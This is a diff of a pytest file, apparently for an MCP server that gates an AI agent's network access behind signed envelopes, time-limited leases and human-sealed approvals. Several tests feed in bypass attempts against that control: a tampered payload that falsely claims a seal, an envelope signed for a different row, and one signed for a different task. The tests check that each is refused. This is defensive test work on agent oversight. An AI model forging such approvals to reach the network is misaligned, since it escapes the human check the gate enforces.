+    assert ledger.rows[-1][1] == na.EVENT_REFUSED and ledger.rows[-1][2]["field"] == "agent"
+
+
+def test_tick_expires_a_held_row_nobody_sealed(egress_keys, verifier, tmp_path, monkeypatch):
+    _, pub = egress_keys
+    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
+    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
+    ledger = _Ledger()
+    out = _held(pg, store)
+    tid = out["task_id"]
+    _stamp(store, out["record_id"], "pair-old")
+    _put_pair(db, "pair-old", "q", out["seal_this"])
+    later = datetime.now(timezone.utc) + timedelta(seconds=na.HELD_MAX_AGE_S + 1)
+    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db,
+                 call=lambda req: pytest.fail("signer must not be called for a stale row"), now=later)
+    row = r["rows"][0]
+    assert row["state"] == "refused" and row["field"] == "age"
+    assert pg.tasks[tid]["status"] == na.EXPIRED_STATUS
+    assert ledger.rows[-1][1] == na.EVENT_REFUSED and ledger.rows[-1][2]["field"] == "age"
+    # just inside the cap: still waiting
+    pg2, store2 = _FakePg(), _FakeStore()
+    out2 = _held(pg2, store2)
+    _stamp(store2, out2["record_id"], "pair-old")
+    r = na.drain(pg=pg2, cols=_COLS, store=store2, db_path=db, call=lambda req: {"state": "unreachable"},
+                 now=datetime.now(timezone.utc) + timedelta(seconds=na.HELD_MAX_AGE_S - 60))
+    assert r["rows"][0]["state"] == "waiting"
 
 
 def test_tick_three_state_on_the_signer_and_the_seal_store(egress_keys, verifier, tmp_path,
@@ -477,19 +618,16 @@ def test_tick_three_state_on_the_signer_and_the_seal_store(egress_keys, verifier
     pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
     out = _held(pg, store)
     _stamp(store, out["record_id"], "pair-3")
-    sealed = _seal(verifier, "q", out["seal_this"])
-    _put_pair(db, "pair-3", "q", out["seal_this"], status="sealed", verifier=verifier["name"],
-              seal_sig=sealed["seal_sig"])
-    # signer down
+    _put_pair(db, "pair-3", "q", out["seal_this"])
+    _seal_in_db(db, "pair-3", verifier, _fresh(verifier, "q", out["seal_this"]))
     r = na.drain(pg=pg, cols=_COLS, store=store, db_path=db,
                  call=lambda req: {"state": "unreachable", "cause": "ECONNREFUSED", "socket": "/x"})
     assert r["rows"][0]["state"] == "unreachable" and r["counts"]["unreachable"] == 1
     assert pg.tasks[out["task_id"]]["status"] == na.HELD_STATUS
-    # nestor.db gone
     r = na.drain(pg=pg, cols=_COLS, store=store, db_path=tmp_path / "nope.db",
                  call=lambda req: pytest.fail("signer must not be called"))
     assert r["rows"][0]["state"] == "unreachable"
-    # a signer that returns an envelope for a DIFFERENT row is a refusal, not a release
+    # a signer that returns a GENUINELY SIGNED envelope for a different row
     def wrong_signer(req):
         return {"state": "minted", "envelope": ea.sign_envelope(
             private_key_path=key, submitted_by="willow", task_id="ZZZZ9999", agent="kart",
@@ -497,7 +635,6 @@ def test_tick_three_state_on_the_signer_and_the_seal_store(egress_keys, verifier
     r = na.drain(pg=pg, cols=_COLS, store=store, db_path=db, call=wrong_signer)
     assert r["rows"][0]["state"] == "refused" and r["rows"][0]["field"] == "envelope"
     assert pg.tasks[out["task_id"]]["status"] == na.HELD_STATUS
-    # no receipt path when there is no ledger: said, not hidden
     assert r["inked"] is False
 
 
@@ -509,6 +646,8 @@ def test_superseded_or_unsigned_pair_is_waiting_not_minted(tmp_path, verifier):
     assert na.read_sealed_pair("b", db)["why"] == "unsigned"
     assert na.read_sealed_pair("c", db)["why"] == "pair_absent"
     assert na.read_sealed_pair("a", tmp_path / "missing.db")["state"] == "unreachable"
+    _put_pair(db, "d", "q", "t", status="sealed", verifier="v", seal_sig="ab")
+    assert na.read_sealed_pair("d", db)["created_at"] == _NOW.isoformat()
 
 
 # ── the executor: a seal stands in for the lease, only after verifying ────────
@@ -520,7 +659,7 @@ def test_executor_accepts_a_seal_minted_envelope_without_a_standing_lease(egress
     monkeypatch.setattr(gate, "permitted", lambda app, perm: True)
     monkeypatch.setattr(consent, "internet_permitted", lambda: True)
     monkeypatch.setattr(lease, "active", lambda app: False)
-    monkeypatch.setattr(lease, "strict_trust_root", lambda: True)  # the executor requires it
+    monkeypatch.setattr(lease, "strict_trust_root", lambda: True)
     monkeypatch.setattr(lease, "self_writable_trust_paths", lambda app: [])
     monkeypatch.setattr(lease, "path_is_self_writable_or_replaceable", lambda p: False)
     monkeypatch.setattr(ea, "public_key_path", lambda: pub)
@@ -532,16 +671,19 @@ def test_executor_accepts_a_seal_minted_envelope_without_a_standing_lease(egress
 
     sealed = ea.sign_envelope(private_key_path=key, submitted_by="willow", task_id="ABCD2345",
                               agent="kart", task_hash=ea.normalized_task_hash(Row.task),
-                              ttl_seconds=60, nonce="n" * 32, seal_pair_id="pair-9")
+                              ttl_seconds=60, nonce="n" * 32, seal_pair_id="d" * 64)
     terminal = ea.sign_envelope(private_key_path=key, submitted_by="willow", task_id="ABCD2345",
                                 agent="kart", task=Row.task, ttl_seconds=60, nonce="m" * 32)
     auth = ea.ExecutorNetworkAuthorizer()
     assert auth(Row(), sealed) is True
     assert auth(Row(), terminal) is False and auth.last_error == "egress lease denied"
-    # an unsigned claim of a seal is worth nothing: tamper the payload
     parsed = json.loads(terminal)
-    parsed["payload"]["seal_pair_id"] = "pair-9"
+    parsed["payload"]["seal_pair_id"] = "d" * 64          # an unsigned claim of a seal
     assert auth(Row(), json.dumps(parsed)) is False and auth.last_error == "invalid signature"
+    other = ea.sign_envelope(private_key_path=key, submitted_by="willow", task_id="ABCD2345",
+                             agent="kart", task_hash=ea.normalized_task_hash("y\n# allow_net"),
+                             ttl_seconds=60, nonce="n" * 32, seal_pair_id="d" * 64)
+    assert auth(Row(), other) is False and auth.last_error == "task hash mismatch"
 
 
 def test_sign_envelope_needs_exactly_one_of_task_or_hash(egress_keys):
@@ -572,7 +714,4 @@ def test_hold_ttl_is_inside_the_lease_ceiling():
     from willow_mcp import lease, server
 
     assert 0 < server._HELD_NET_TTL_SECONDS <= lease.MAX_TTL_SECONDS
-
-
-def test_now_is_utc():
-    assert na._now().tzinfo == timezone.utc and isinstance(datetime.now(timezone.utc), datetime)
+    assert na.SEAL_MAX_AGE_S == na.HELD_MAX_AGE_S
